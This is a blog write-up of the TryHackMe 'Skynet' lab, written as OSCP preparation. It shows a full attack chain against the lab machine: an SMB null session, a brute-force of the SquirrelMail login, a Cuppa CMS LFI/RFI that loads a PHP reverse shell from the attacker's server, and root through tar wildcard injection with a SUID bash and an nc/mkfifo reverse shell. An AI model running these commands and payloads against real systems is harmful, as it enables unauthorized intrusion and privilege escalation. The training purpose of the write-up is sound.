---
layout: post
title:  THM Skynet Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-15 09:00:00 +0300
image:  '/images/thm_skynet.png'
tags:   [Write-ups, THM, OSCP+, Easy, SMB-Null-Session, Login-Brute-Force, CVE, RFI, Tar-Wildcard-Expansion]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [SMB Null Session](#smb-null-session)
  - [Web Enumeration](#web-enumeration)
  - [Brute-forcing SquirrelMail login portal to get access](#brute-forcing-squirrelmail-login-portal-to-get-access)
  - [SMB access as milesdyson after finding password inside email and finding important.txt](#smb-access-as-milesdyson-after-finding-password-inside-email-and-finding-importanttxt)
- [Foothold](#foothold)
  - [Finding /45kra24zxs28v3yd and Cuppa RFI Exploitation](#finding-45kra24zxs28v3yd-and-cuppa-rfi-exploitation)
- [Privilege Escalation](#privilege-escalation)
  - [Tar Wildcard Expansion SUID Injection](#tar-wildcard-expansion-suid-injection)
  - [Alternative Method - Tar Wildcard Expansion Reverse Shell Injection](#alternative-method---tar-wildcard-expansion-reverse-shell-injection)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.232.106

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p22,80,110,139,143,445 10.10.232.106
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 14:14 EST
Nmap scan report for 10.10.232.106
Host is up (0.046s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL CAPA TOP RESP-CODES AUTH-RESP-CODE UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: Pre-login LITERAL+ more capabilities post-login IDLE LOGINDISABLEDA0001 LOGIN-REFERRALS have listed OK SASL-IR IMAP4rev1 ENABLE ID
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-11-14T13:14:19-06:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-14T19:14:19
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds
```

### SMB Null Session
We can access SMB without credentials using the following command:

```shell
impacket-smbclient '':''@10.10.232.106
```

That gave us SMB access successfully. Enumerating the shares we found the following:

```shell
# shares
print$
anonymous
milesdyson
IPC$
```

We cant access the share milesdyson, but we will write that name down, since its seem to be a username.

We were able to get access into the anonymous share. There we can find the following:

```shell
# use anonymous
# ls
drw-rw-rw-          0  Thu Nov 26 11:04:00 2020 .
drw-rw-rw-          0  Tue Sep 17 03:20:17 2019 ..
-rw-rw-rw-        163  Tue Sep 17 23:04:59 2019 attention.txt
drw-rw-rw-          0  Wed Sep 18 00:42:16 2019 logs
```

We can download attention.txt and everything inside logs:

```shell
# get attention.txt
# cd logs
# mget *
[*] Downloading log2.txt
[*] Downloading log1.txt
[*] Downloading log3.txt
```

The file attention.txt contains the following:

```shell
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Inside log1.txt we can find the following possible passwords:

```shell
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

The files log2.txt and log3.txt are empty.

### Web Enumeration
If we visit the website, we will find a skynet search:

```shell
http://10.10.232.106/
```

Lets use Feroxbuster to find extra directories:

```shell
feroxbuster -u http://10.10.232.106/ -w /usr/share/wordlists/dirb/common.txt
```

Feroxbuster gave us some results, including this login portal for the SquirrelMail Login:

```shell
http://10.10.232.106/squirrelmail/
```

Which redirected us to: 

```shell
http://10.10.232.106/squirrelmail/src/login.php
```

### Brute-forcing SquirrelMail login portal to get access
We will use the log1.txt list containing passwords to bruteforce the SquirrelMail using the user milesdyson.

We can do this with Burp Suite Intruder, OWASP ZAP Fuzzing or Hydra, or even try each password manually.

I used Burp Suite Intruder with the community edition since we dont have many passwords on log1.txt.

The intercepted request when trying to log in looks like this:

```shell
POST /squirrelmail/src/redirect.php HTTP/1.1
Host: 10.10.232.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: http://10.10.232.106
Connection: keep-alive
Referer: http://10.10.232.106/squirrelmail/src/login.php
Cookie: squirrelmail_language=en_US; SQMSESSID=toqibitblgid0ev6mldrbo41e1
Upgrade-Insecure-Requests: 1


login_username=testname&secretkey=testpassword&js_autodetect_results=1&just_logged_in=1
```

We can do right-click on it and send it to Intruder.

Change the username to milesdyson and Add § on testpassword in the request:

```shell
<SNIP>
login_username=milesdyson&secretkey=§testpassword§&js_autodetect_results=1&just_logged_in=1
```

Select as payload the log1.txt list.

Then click on Start attack.

We will notice that there is one password which gave us a different response:

```shell
cyborg007haloterminator
```

Lets try to log in as milesdyson using that password:

```shell
http://10.10.232.106/squirrelmail/src/login.php
```

It worked! We are in.

### SMB access as milesdyson after finding password inside email and finding important.txt
Checking the emails, we found the following password inside the email Samba Password Reset:

```shell
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Now we can try these credentials to get SMB access:

```shell
impacket-smbclient milesdyson:')s{A&2Z=F^n_E.B`'@10.10.232.106
```

Enumerating and checking files inside the SMB share of milesdyson, we found a file called important.txt.

# Foothold
### Finding /45kra24zxs28v3yd and Cuppa RFI Exploitation

Inside important.txt we found the following:

```shell
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

It seems like its a hidden directory, lets try to access it:

```shell
http://10.10.232.106/45kra24zxs28v3yd/
```

Using Feroxbuster we found /administrator:

```shell
feroxbuster -u http://10.10.232.106/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
```

Lets access it:

```shell
http://10.10.232.106/45kra24zxs28v3yd/administrator
```

It seems like a login portal. We can notice that its using Cuppa CMS.

Using searchsploit to find an exploit for Cuppa CMS we found the following:

```shell
searchsploit cuppa
```

```shell
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   | php/webapps/25971.txt
---------------------------------------------------------------------------------- ---------------------------------
```

Lets get it:

```shell
searchsploit -m 25971
```

Reading the exploit, we can know more about how this exploit works.

We can try reading the contents of /etc/passwd abusing the LFI vulnerability if we visit the following link:

```shell
http://10.10.232.106/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

It worked! We were able to read the contents of /etc/passwd.

We can abuse this further using a reverse shell to get access.

Create a php reverse shell first. I will use the PHP Pentestmonkey php-reverse-shell with our Kali IP and default port 1234 from our nc listener. We will copy it inside a file called shell.php:

```shell
# Locate shell on Kali
locate php-reverse-shell.php

# Copy shell to current directory
cp /usr/share/webshells/php/php-reverse-shell.php .

# Open shell file and edit the IP to the IP of our Kali tun0
sudo gedit php-reverse-shell.php
```

Note: I tried multiple PHP reverse shells, some worked, some didnt. The one above definitely worked.

Then start a python server where shell.php is located:

```shell
python3 -m http.server 8443
```

Start nc listener after that:

```shell
nc -lvnp 1234
```

Now we can trigger the reverse shell and get a shell as www-data visiting the following URL on the web browser:

```shell
http://10.10.232.106/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.113.193:8443/php-reverse-shell.php
```

Success! Our nc listener got a response:
```shell
listening on [any] 1234 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.232.106] 59476
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 14:58:44 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Upgrade the shell:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### User Flag
Now we can get the user.txt flag:

```shell
cat /home/milesdyson/user.txt
```

# Privilege Escalation
### Tar Wildcard Expansion SUID Injection
Enumerating the directory of milesdyson, we found the script backup.sh:

```shell
www-data@skynet:/home/milesdyson/backups$ ls
ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson/backups$ ls -al
ls -al
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Nov 14 15:06 backup.tgz
```

When finding a bash script, there is a good change that is being run by root using a cron job. We can check cron jobs with the following command:

```shell
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

There is a line telling us its being run every minute:

```shell
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```

We can do a tar wildcard expansion injection to set a SUID on /bin/bash:

```shell
# Tar wildcard injection
cd /var/www/html
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Check if the SUID binary of /bin/bash changed:

```shell
ls -al /bin/bash

-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

Notice the s at -rwsr-sr-x. It worked!

Now we can get shell as root running the following command:

```shell
/bin/bash -p
```

```shell
bash-4.3$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
```

### Alternative Method - Tar Wildcard Expansion Reverse Shell Injection
Start a nc listener first:

```shell
nc -lvnp 8443
```


Now, taking as reference the commands we previously used, we can also inject a reverse shell instead:

```shell
# Tar wildcard injection with a reverse shell
cd /var/www/html
printf 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.113.193 8443 >/tmp/f' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Wait for root cron job to run and check our nc listener. After 1 minute, we will get a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.232.106] 51380
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

### Root Flag
Now we can get the root.txt flag:

```shell
cat /root/root.txt
```








